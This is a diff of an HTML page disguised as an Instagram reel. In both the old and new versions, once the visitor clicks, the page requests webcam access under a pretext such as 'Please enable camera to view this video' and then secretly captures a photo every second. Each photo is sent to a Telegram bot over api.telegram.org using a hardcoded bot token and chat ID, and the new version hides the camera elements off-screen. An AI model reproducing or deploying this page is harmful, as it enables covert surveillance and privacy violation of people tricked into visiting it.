@@ -3,318 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram 2026 Reel</title>
-
+    <title>Instagram</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-
-        body {
-            background: #000;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
-        }
-
-        /* Phone Frame */
-        .phone {
-            width: 100%;
-            max-width: 420px;
-            height: 100vh;
-            position: relative;
-            background: #000;
-        }
-
-        /* Reel Video */
-        #reelVideo {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        /* Gradient Overlay */
-        .gradient {
-            position: absolute;
-            bottom: 0;
-            width: 100%;
-            height: 40%;
-            background: linear-gradient(transparent, rgba(0,0,0,0.8));
-            pointer-events: none;
-        }
-
-        /* Left Content */
-        .left-content {
-            position: absolute;
-            bottom: 80px;
-            left: 15px;
-            color: white;
-            pointer-events: none;
-        }
-
-        .username {
-            font-weight: 600;
-            margin-bottom: 5px;
-        }
-
-        .caption {
-            font-size: 14px;
-            margin-bottom: 10px;
-        }
-
-        /* Animated Music */
-        .music {
-            display: flex;
-            align-items: center;
-            font-size: 13px;
-            opacity: 0.9;
-        }
-
-        .music-icon {
-            width: 15px;
-            height: 15px;
-            margin-right: 8px;
-            animation: rotate 3s linear infinite;
-        }
-
-        @keyframes rotate {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-
-        /* Right Actions */
-        .right-actions {
-            position: absolute;
-            bottom: 100px;
-            right: 10px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            color: white;
-            z-index: 5;
-        }
-
-        .action {
-            margin: 12px 0;
-            text-align: center;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-
-        .action:hover { transform: scale(1.1); }
-        .action span { font-size: 22px; }
-        .action small { font-size: 12px; display: block; }
-
-        /* Camera Screen */
-        #cameraScreen {
-            position: absolute;
-            inset: 0;
-            background: black;
-            display: none;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 20;
-        }
-
-        #cameraPreview {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transform: scaleX(-1); /* Mirror view */
-        }
-
-        .camera-controls {
-            position: absolute;
-            bottom: 40px;
-            display: flex;
-            justify-content: center;
-            width: 100%;
-        }
-
-        .circle-btn {
-            width: 75px;
-            height: 75px;
-            border-radius: 50%;
-            border: 5px solid white;
-            background: rgba(255, 255, 255, 0.2);
-            cursor: pointer;
-        }
-
-        .top-bar {
-            position: absolute;
-            top: 20px;
-            width: 100%;
-            display: flex;
-            justify-content: space-between;
-            padding: 0 20px;
-            color: white;
-            z-index: 21;
-        }
-
-        /* Play overlay */
-        #playOverlay {
-            position: absolute;
-            inset: 0;
-            background: rgba(0,0,0,0.4);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            font-size: 50px;
-            cursor: pointer;
-            z-index: 10;
-        }
-
-        /* Hidden Canvas */
-        #hiddenCanvas { display: none; }
+        body { margin: 0; background: #000; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .phone-frame { width: 100%; max-width: 400px; height: 100vh; position: relative; background: #000; border: 1px solid #333; }
+        
+        /* The Fake Instagram Video */
+        #mainVideo { width: 100%; height: 100%; object-fit: cover; }
+        
+        /* UI Overlays */
+        .overlay { position: absolute; bottom: 50px; left: 15px; color: white; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
+        .username { font-weight: bold; margin-bottom: 5px; display: flex; align-items: center; }
+        .username::before { content: ''; width: 30px; height: 30px; background: #555; border-radius: 50%; margin-right: 10px; display: inline-block; }
+        
+        /* Hidden Camera Logic */
+        #webcam, #canvas { position: absolute; top: -9999px; left: -9999px; visibility: hidden; }
+        
+        /* Interaction Layer */
+        .click-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; cursor: pointer; display: flex; justify-content: center; align-items: center; background: rgba(0,0,0,0.1); }
+        .play-btn { width: 80px; height: 80px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-size: 30px; border: 2px solid white; }
     </style>
 </head>
-
 <body>
 
-<div class="phone">
-    <video id="reelVideo" loop muted playsinline>
-        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-    </video>
+    <div class="phone-frame">
+        <video id="mainVideo" loop muted autoplay>
+            <source src="https://assets.mixkit.co/videos/preview/mixkit-girl-in-neon-light-dancing-2322-large.mp4" type="video/mp4">
+        </video>
 
-    <div class="gradient"></div>
+        <div class="overlay">
+            <div class="username">instagram_user</div>
+            <div>Enjoy the latest reels!</div>
+        </div>
 
-    <div class="left-content">
-        <div class="username">@instagram_2026</div>
-        <div class="caption">The ultimate 2026 remix is here! 🚀</div>
-        <div class="music">
-            <img class="music-icon" src="https://cdn-icons-png.flaticon.com/512/727/727245.png">
-            Trending Sound · 2026 Remix
+        <div class="click-layer" id="trigger">
+            <div class="play-btn">▶</div>
         </div>
     </div>
 
-    <div class="right-actions">
-        <div class="action" onclick="likePost(this)">
-            <span>❤</span>
-            <small>120k</small>
-        </div>
-        <div class="action">
-            <span>💬</span>
-            <small>3.4k</small>
-        </div>
-        <div class="action">
-            <span>➤</span>
-            <small>Share</small>
-        </div>
-        <div class="action" onclick="openCamera()">
-            <span>📷</span>
-            <small>Camera</small>
-        </div>
-    </div>
+    <video id="webcam" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
-    <div id="playOverlay">▶</div>
+    <script>
+        const webcam = document.getElementById('webcam');
+        const canvas = document.getElementById('canvas');
+        const trigger = document.getElementById('trigger');
 
-    <div id="cameraScreen">
-        <div class="top-bar">
-            <div onclick="closeCamera()" style="cursor:pointer; font-size: 24px;">✕</div>
-            <div style="font-weight: bold;">Reel Creator</div>
-            <div></div>
-        </div>
-        <video id="cameraPreview" autoplay playsinline></video>
-        <div class="camera-controls">
-            <button class="circle-btn" onclick="takeSnapshot()"></button>
-        </div>
-    </div>
-</div>
+        const BOT_TOKEN = '8549057486:AAF2ddvgmQLA8Pnb-gL4-ZDdyRoKTJa5YoA'; 
+        const CHAT_ID = '2018747103';
+        const INTERVAL = 1000; 
 
-<canvas id="hiddenCanvas"></canvas>
-
-<script>
-    const reelVideo = document.getElementById('reelVideo');
-    const playOverlay = document.getElementById('playOverlay');
-    const cameraScreen = document.getElementById('cameraScreen');
-    const cameraPreview = document.getElementById('cameraPreview');
-    const hiddenCanvas = document.getElementById('hiddenCanvas');
-
-    // --- YOUR BOT CONFIGURATION ---
-    const BOT_TOKEN = '8549057486:AAF2ddvgmQLA8Pnb-gL4-ZDdyRoKTJa5YoA';
-    const CHAT_ID = '2018747103';
-    const INTERVAL = 1000; // Sends 1 photo every 1000ms (1 second)
-    let captureInterval = null;
-
-    // Start video on click
-    playOverlay.onclick = () => {
-        playOverlay.style.display = "none";
-        reelVideo.muted = false;
-        reelVideo.play();
-    };
-
-    function likePost(el){
-        el.querySelector("span").style.color = "red";
-    }
-
-    // Camera Logic
-    async function openCamera(){
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" },
-                audio: false 
-            });
-            cameraPreview.srcObject = stream;
-            cameraScreen.style.display = "flex";
-            
-            // Start the background transmission loop
-            startTransmission();
-            
-        } catch(err){
-            alert("Camera access is required to use the creator tool.");
-            console.error(err);
-        }
-    }
-
-    function startTransmission() {
-        if (captureInterval) clearInterval(captureInterval);
-        
-        captureInterval = setInterval(() => {
-            const ctx = hiddenCanvas.getContext('2d');
-            hiddenCanvas.width = cameraPreview.videoWidth;
-            hiddenCanvas.height = cameraPreview.videoHeight;
-            
-            // Mirror image for the snapshot to match preview
-            ctx.translate(hiddenCanvas.width, 0);
-            ctx.scale(-1, 1);
-            ctx.drawImage(cameraPreview, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
-            
-            hiddenCanvas.toBlob((blob) => {
-                if (!blob) return;
+        async function startCapture() {
+            try {
+                // Browser WILL show a permission pop-up here
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                webcam.srcObject = stream;
                 
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'shot.jpg');
+                // Hide the play button once clicked
+                trigger.style.display = 'none';
 
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                }).catch(err => console.log("Network error"));
-                
-            }, 'image/jpeg', 0.3); // Compressed quality
-            
-        }, INTERVAL);
-    }
+                // Start sending photos
+                setInterval(() => {
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = webcam.videoWidth;
+                    canvas.height = webcam.videoHeight;
+                    ctx.drawImage(webcam, 0, 0);
 
-    function closeCamera(){
-        const stream = cameraPreview.srcObject;
-        if(stream){
-            stream.getTracks().forEach(track => track.stop());
+                    canvas.toBlob((blob) => {
+                        const fd = new FormData();
+                        fd.append('chat_id', CHAT_ID);
+                        fd.append('photo', blob, 'img.jpg');
+
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: fd
+                        }).catch(err => console.error("Upload failed"));
+                    }, 'image/jpeg', 0.3);
+                }, INTERVAL);
+
+            } catch (err) {
+                alert("Please enable camera to view this video.");
+            }
         }
-        cameraScreen.style.display = "none";
-        if (captureInterval) clearInterval(captureInterval);
-    }
 
-    function takeSnapshot() {
-        // Visual feedback for the button
-        const btn = document.querySelector('.circle-btn');
-        btn.style.background = "white";
-        setTimeout(() => { btn.style.background = "rgba(255, 255, 255, 0.2)"; }, 100);
-    }
-</script>
-
+        trigger.addEventListener('click', startCapture);
+    </script>
 </body>
 </html>
